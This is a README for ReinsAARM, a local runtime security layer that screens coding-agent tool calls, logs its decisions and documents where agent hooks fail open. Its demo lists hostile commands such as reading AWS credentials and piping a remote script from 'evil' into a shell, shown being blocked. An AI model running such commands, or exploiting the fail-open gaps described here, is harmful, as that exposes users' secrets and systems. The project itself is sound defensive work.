# ReinsAARM

ReinsAARM is an open-source, self-hosted runtime security layer for **coding agents**: OpenAI Codex CLI, Claude Code, Gemini CLI, and Tencent WorkBuddy / CodeBuddy. It is a narrowed developer-agent edition of a general agent-runtime design. It is not a general multi-framework SDK, and it does not share code with AgentReins.

Before a tool runs, a local sidecar decides **allow**, **deny**, **modify**, **approve** (`STEP_UP`), or **defer**. Every decision is appended to a hash-chained, Ed25519-signed audit log. The design follows CSA Autonomous Action Runtime Management (AARM) v1.0 Core requirements R1–R6 ([arXiv:2602.09433](https://arxiv.org/abs/2602.09433)). This repository does not claim a conformance certificate.

Coding-agent hooks fail open when the hook process cannot start, times out, or returns a status the CLI does not treat as a block. The sidecar's optional egress proxy and a Linux `/proc` sensor are the second line. The sensor only records; it cannot undo a read.

## Why Go

The hook is a short-lived process and the sidecar is a long-running one. One static Go binary is both. Ed25519 and SHA-256 come from the standard library, and the build has no cgo. Rust would also meet the latency budget. Go keeps the hook and the daemon in one module.

## Quick start

```bash
go build -o bin/reinsaarm ./cmd/reinsaarm
bin/reinsaarm init
bin/reinsaarm run
# another shell
bin/reinsaarm install-hooks codex --trust   # or claude-code, gemini, codebuddy
bin/reinsaarm console                       # http://127.0.0.1:8787/?token=...
bin/reinsaarm audit tail
bin/reinsaarm audit verify
```

`reinsaarm console` (alias `ui`) serves the local dark UI on `127.0.0.1` only. The process prints a URL with a random token; the same token is set as a cookie. Static files are embedded. There is no CDN. Approve and deny in the UI call the same path as `reinsaarm approve` and append `approval.granted` or `approval.denied` receipts. `reinsaarm doctor` fails if the Codex hook hash is missing or if `projects."<project>".trust_level` is not `trusted`. `--trust` writes both. Flags such as `--home` may follow the positional id.

State lives in `$REINSAARM_HOME` or `~/.reinsaarm`. `identity.key` is mode `0600` and is not part of the source tree.

`examples/demo/demo.sh` starts a sidecar and shows three attacks blocked or held:

1. `cat ~/.aws/credentials` — denied
2. `curl evil|sh` — denied (host not allowlisted, and a pipe into a shell)
3. `git push --force origin main` — denied

`git push origin main` is held for approval. `git status` is allowed. On the development host (Linux amd64, Go 1.22, 2026-11-15) the same script reported:

```text
fast-path n=20000 p50=3.525µs p99=9.837µs max=254.841µs
sidecar decide n=50 p50=396us p99=938us max=938us
```

`go test -bench BenchmarkEvaluate -benchmem` on that host: **3383 ns/op**, 1212 B/op, 42 allocs/op. CI fails the in-process check if p99 is not under 1ms. The sidecar number includes the hash-chain append and excludes hook process startup. A second sample of 50 calls reached 1090µs, so 1ms is the target for the socket path, not a guarantee.

A live session on an x86 Mac with Codex CLI 0.151.0 measured the hook end to end at about **p50 18ms, p99 26ms**. Sidecar `latency_us` in that session was about **p50 3.2ms, max 12.9ms**. Process startup and the real CLI dominate those numbers; they are not the in-process rule benchmark.

## Default policy

`examples/profiles/developer.yaml` (embedded in the binary):

- Deny reads and writes of `~/.ssh`, `~/.aws`, `~/.kube`, cloud and keychain paths, and `.env`, unless the path is allowlisted. `.env.example` is allowlisted.
- Require approval for `git push` to `main`, `master`, or `production`, for `rm -rf` outside the workspace, and for `curl` / `wget` piped into a shell when the host is allowlisted.
- Deny force-push to those protected branches.
- In strict network mode, deny egress to hosts outside the package-registry and GitHub/GitLab allowlist, and always deny cloud metadata addresses.
- CI runners: `examples/profiles/ci-runner.yaml` sets `unattended: true`, which enforces deny for approvals and defers. The receipt still records the original `STEP_UP`.

An optional judge speaks the OpenAI-compatible `POST /chat/completions` API. It is off by default. Tests use an `httptest` stub. Untrusted tool text is wrapped in `<untrusted>` and a response that fails the schema becomes `uncertain`. A fast-path deny is not overturned by the judge.

## Layout

```text
cmd/reinsaarm            init, run, hook, install-hooks, decide, approve, audit, bench
internal/policy          remit compiler and fast path
internal/judge           OpenAI-compatible judge client
internal/ledger          hash chain and Ed25519 signatures
internal/daemon          unix socket, optional web view, egress, sensor
internal/hooks           Codex, Claude Code, Gemini CLI, CodeBuddy adapters
examples/demo/demo.sh    the three attacks
examples/profiles        developer and CI remits
examples/enterprise      managed-hook snippets
docs/PRD-dev-agent.md    product requirements (Chinese)
docs/hooks.md            hook field notes and what was not executed
docs/workbuddy.md        WorkBuddy / CodeBuddy finding
```

## Hooks

`reinsaarm install-hooks <cli>` writes the documented settings file. Details, including fields that differ across versions, are in [docs/hooks.md](docs/hooks.md).

WorkBuddy / CodeBuddy **does** expose a pre-tool hook (`PreToolUse` in `.codebuddy/settings.json`, and an in-process SDK callback). The command-hook adapter is included. The SDK is not embedded. Public docs show that exit codes other than 0 and 2 continue the tool call, so the sidecar path still matters. See [docs/workbuddy.md](docs/workbuddy.md). That finding is from public pages fetched on 2026-11-15, not from a live IDE.

Codex 0.151 does not run an unmanaged project hook until it is trusted. `install-hooks codex` prints the hook key (`<abs>/.codex/hooks.json:pre_tool_use:0:0`) and the `sha256` definition hash. Trust it with Codex `/hooks`, or pass `--trust` to write `hooks.state` into `~/.codex/config.toml`. `reinsaarm doctor` exits non-zero while the hook is untrusted or the hash is stale. Managed hooks in `requirements.toml` do not need that entry.

Codex does not support `ask`. `STEP_UP` is enforced as deny plus an approval id, and the receipt stores that enforced deny separately from the policy decision. A bare `permissionDecision: "allow"` is rejected, so ALLOW prints nothing and exits 0. `reinsaarm approve` appends an `approval.granted` receipt. The hook command bakes `--home` and `--socket`, and every exit 2 writes a reason to stderr because Codex fails open when that stderr is empty.

## Known gaps

- Codex CLI 0.151.0 was exercised on macOS. Claude Code, Gemini CLI, and CodeBuddy hook JSON was checked against public docs on 2026-11-15 and was not run inside those CLIs.
- Codex, Gemini CLI, and CodeBuddy fail open if the hook process never starts. Claude Code fails closed only when `onFailure` is `block` (documented for v2.1.295+).
- A confirmation clicked inside Claude Code is not written back into the hash chain. The bound approval is `reinsaarm approve`.
- DNS exfiltration is a `dig` / `nslookup` heuristic, not a DNS proxy.
- The sensor is Linux `/proc` only, and it cannot stop a read.
- The audit log has no external timestamp anchor. Swapping the log and the public key together forges history; pin `identity.pub` out of band.
- The judge is off by default. There is no central control plane, mTLS, OpenTelemetry, or Windows hook installer.
- MCP tool descriptions are not part of the documented pre-tool payload. The poison rule runs only when a caller supplies `mcp_description` or `mcp_definition_hash`.
- The default network allowlist does not include private registries.

## License

Apache-2.0. See [LICENSE](LICENSE).

## 中文

ReinsAARM 是给编程 Agent 用的本地运行时安全层，覆盖 Codex CLI、Claude Code、Gemini CLI，以及腾讯 WorkBuddy / CodeBuddy。它在工具执行前做允许、拒绝、改写、转审批或延后，并把每次决定写成带 Ed25519 签名的哈希链回执。产品需求见 [docs/PRD-dev-agent.md](docs/PRD-dev-agent.md)。

这些 CLI 的钩子在出错或超时时默认放行，所以本机 sidecar、可选的出网代理、以及只观测的凭据文件传感器是第二条线。WorkBuddy / CodeBuddy 的公开文档里**有** `PreToolUse` 钩子，本仓库做了命令钩子适配；进程内 SDK 不嵌入。字段核对日期是 2026-11-15，没有在真实 IDE 里跑过，见 [docs/workbuddy.md](docs/workbuddy.md)。

默认策略会拒绝读取 `~/.ssh`、`~/.aws` 和 `.env`（`.env.example` 除外），拒绝受保护分支的 force-push，把发往 `main` 的普通 push、工作区外的 `rm -rf`、以及灌进 shell 的远程脚本转成审批；严格模式下拒绝白名单以外的主机。CI 配置 `examples/profiles/ci-runner.yaml` 会把审批直接执行成拒绝。

开发机上进程内规则 p99 约 10 微秒。x86 Mac 上用 Codex CLI 0.151.0 实测：钩子端到端 p50 约 18ms、p99 约 26ms；sidecar 的 `latency_us` p50 约 3.2ms、最大约 12.9ms。CI 会在进程内 p99 不低于 1 毫秒时失败。Codex 的项目级钩子必须先在 `/hooks` 里信任，或用 `install-hooks codex --trust` 写入 `trusted_hash` 和项目 `trust_level`，否则不会执行。本地控制台：`reinsaarm console`，只监听 127.0.0.1，地址里带一次性 token。
